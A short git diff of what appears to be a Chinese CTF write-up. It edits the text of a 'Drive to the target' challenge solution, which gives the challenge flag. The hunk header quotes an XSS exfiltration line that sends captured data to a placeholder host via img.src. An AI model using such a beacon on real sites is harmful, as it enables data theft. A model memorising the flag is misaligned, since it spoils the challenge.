@@ -82,7 +82,7 @@ img.src = 'http://MYSITEIP/' + encodeURIComponent(t);
 
 ## Drive to the target
 
-给了一个网站，有一个初始坐标，你可以改动坐标，一步一步走到目的地。但问题是每一次走的距离是有限制的，速度也是有限制的，需要走很多步才行。人肉点击应该是不现实了，于是打开浏览器console，写了下面这个脚本，跑了起来。但跑了好长好长时间也没到目的地，于是再到B站刷几个视频，还没到目的地，再到TouTube刷几个视频。。最后终于还是结束了，拿到`CTF{Who_is_Tardis_Ormandy}`。
+给了一个网站，有一个初始坐标，你可以改动坐标，一步一步走到目的地。但问题是每一次走的距离是有限制的，速度也是有限制的，需要走很多步才行。人肉点击应该是不现实了，于是打开浏览器console，写了下面这个脚本，跑了起来。但跑了好长好长时间也没到目的地，于是再到B站刷几个视频，还没到目的地，再到YouTube刷几个视频，终于结束了，拿到`CTF{Who_is_Tardis_Ormandy}`。
 
 ```javascript
 var a = +document.getElementsByTagName('input')[0].value;
